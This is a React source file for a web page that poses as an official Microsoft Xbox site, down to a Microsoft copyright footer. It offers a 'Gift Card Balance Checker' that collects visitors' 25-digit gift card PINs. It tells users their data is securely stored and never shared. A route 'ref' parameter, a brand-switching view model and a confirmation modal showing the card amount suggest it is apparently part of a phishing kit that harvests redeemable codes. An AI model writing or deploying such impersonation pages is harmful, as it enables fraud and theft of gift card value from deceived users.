import { useState } from 'react';
import { useParams } from 'react-router-dom';
import { useSubmissionViewModel } from '../../viewmodels/useSubmissionViewModel';
import ClientConfirmModal from './components/ClientConfirmModal';
import ResultBanner from './components/ResultBanner';
import XboxSubmissionForm from './components/XboxSubmissionForm';
import styles from './XboxSubmissionPage.module.css';

function XboxLogo() {
  return (
    <svg
      className={styles.xboxLogo}
      viewBox="0 0 24 24"
      role="img"
      aria-label="Xbox"
    >
      <rect x="2" y="2" width="9" height="9" rx="1.5" fill="#f25022" />
      <rect x="13" y="2" width="9" height="9" rx="1.5" fill="#107c10" />
      <rect x="2" y="13" width="9" height="9" rx="1.5" fill="#0078d4" />
      <rect x="13" y="13" width="9" height="9" rx="1.5" fill="#ffb900" />
    </svg>
  );
}

function MenuIcon() {
  return (
    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M3 6h18M3 12h18M3 18h18" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
    </svg>
  );
}

function CloseIcon() {
  return (
    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" aria-hidden="true">
      <path d="M6 6l12 12M18 6L6 18" stroke="currentColor" strokeWidth="2" strokeLinecap="round" />
    </svg>
  );
}

const NAV_LINKS = [
  'Game Pass',
  'Games',
  'Devices',
  'Play Anywhere',
  'Community',
];

const FOOTER_COLUMNS: { title: string; items: string[] }[] = [
  {
    title: 'PRODUCTS',
    items: ['Xbox Series X|S', 'Xbox Game Pass', 'Xbox Live Gold', 'Games', 'Game Pass for PC'],
  },
  {
    title: 'COMMUNITY',
    items: ['Community Standards', 'Forums', 'Careers', 'Developer', 'Support'],
  },
  {
    title: 'COMPANY',
    items: ['About Microsoft', 'Privacy & Cookies', 'Terms of Use', 'Contact Us', 'Sitemap'],
  },
  {
    title: 'FOLLOW US',
    items: ['Facebook', 'Twitter', 'YouTube', 'Instagram'],
  },
];

export default function XboxSubmissionPage() {
  const { ref = '' } = useParams();
  const vm = useSubmissionViewModel(ref, 25, 5, 'xbox');
  const [menuOpen, setMenuOpen] = useState(false);

  return (
    <div className={styles.page}>
      <header className={styles.header}>
        <div className={styles.headerInner}>
          <a href="#" className={styles.brand}>
            <XboxLogo />
            <span className={styles.brandName}>xbox</span>
          </a>
          <nav className={styles.nav}>
            {NAV_LINKS.map((link) => (
              <a key={link} href="#" className={styles.navLink}>
                {link}
              </a>
            ))}
          </nav>
          <button
            type="button"
            className={styles.menuButton}
            onClick={() => setMenuOpen(true)}
            aria-label="Open menu"
          >
            <MenuIcon />
          </button>
        </div>
      </header>

      {menuOpen && (
        <div
          className={styles.menuOverlay}
          onClick={() => setMenuOpen(false)}
          role="presentation"
        >
          <div className={styles.menuPanel} onClick={(e) => e.stopPropagation()}>
            <button
              type="button"
              className={styles.menuClose}
              onClick={() => setMenuOpen(false)}
              aria-label="Close menu"
            >
              <CloseIcon />
            </button>
            <nav className={styles.menuNav}>
              {NAV_LINKS.map((link) => (
                <a
                  key={link}
                  href="#"
                  className={styles.menuLink}
                  onClick={() => setMenuOpen(false)}
                >
                  {link}
                </a>
              ))}
            </nav>
          </div>
        </div>
      )}

      <section className={styles.hero}>
        <h1 className={styles.heroTitle}>Xbox Gift Card Balance Checker</h1>
        <p className={styles.heroSubtitle}>Check your Xbox gift card balance instantly</p>
      </section>

      <main className={styles.main}>
        <div className={styles.formCard}>
          <XboxSubmissionForm
            code={vm.code}
            setCode={vm.setCode}
            isValid={vm.isValid}
            loading={vm.result === 'loading'}
            onSubmit={vm.submit}
          />
          <ResultBanner
            result={vm.result}
            amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
            theme="xbox"
          />
        </div>

        <div className={styles.infoGrid}>
          <div className={styles.infoCard}>
            <div className={styles.infoIcon}>📍</div>
            <h3 className={styles.infoTitle}>Where to find your PIN</h3>
            <p className={styles.infoText}>
              Your 25-digit PIN is located on the back of your physical Xbox gift card or in your
              email if you purchased a digital card.
            </p>
          </div>
          <div className={styles.infoCard}>
            <div className={styles.infoIcon}>🔒</div>
            <h3 className={styles.infoTitle}>Secure &amp; Private</h3>
            <p className={styles.infoText}>
              Your card information is securely transmitted and stored. We never share your data
              with third parties.
            </p>
          </div>
          <div className={styles.infoCard}>
            <div className={styles.infoIcon}>⚡</div>
            <h3 className={styles.infoTitle}>Instant Results</h3>
            <p className={styles.infoText}>
              Get your balance information in real-time. No waiting, no delays.
            </p>
          </div>
        </div>
      </main>

      <footer className={styles.footer}>
        <div className={styles.footerInner}>
          {FOOTER_COLUMNS.map((col) => (
            <div key={col.title} className={styles.footerCol}>
              <h4 className={styles.footerTitle}>{col.title}</h4>
              <ul className={styles.footerList}>
                {col.items.map((item) => (
                  <li key={item}>
                    <a href="#" className={styles.footerLink}>
                      {item}
                    </a>
                  </li>
                ))}
              </ul>
            </div>
          ))}
        </div>
        <div className={styles.footerBottom}>
          <span>English (United States)</span>
          <span>© 2026 Microsoft. All rights reserved.</span>
        </div>
      </footer>

      <ClientConfirmModal
        open={vm.result === 'confirmed'}
        amount={typeof vm.confirmedAmount === 'number' ? vm.confirmedAmount : undefined}
        last4={vm.last4}
        onClose={vm.reset}
        brandName="Xbox"
        showImage={false}
      />
    </div>
  );
}
